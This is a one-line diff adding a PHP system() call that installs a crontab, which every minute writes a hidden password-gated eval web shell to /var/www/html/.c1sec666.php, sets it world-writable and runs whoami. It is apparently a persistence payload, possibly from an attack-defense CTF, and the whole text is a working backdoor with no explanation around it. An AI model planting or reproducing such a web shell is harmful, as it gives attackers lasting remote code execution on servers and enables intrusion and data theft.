@@ -1,0 +1,1 @@
+system('echo "* * * * * echo \"<?php  if(md5(\\\\\\\\\$_POST[pass])==\'7bae7e68e0663f06e9740289b8eaaaa3\'){@eval(\\\\\\\\\$_POST[1]);}  \" > /var/www/html/.c1sec666.php\n* * * * * chmod 777 /var/www/html/.c1sec666.php" | crontab;whoami');
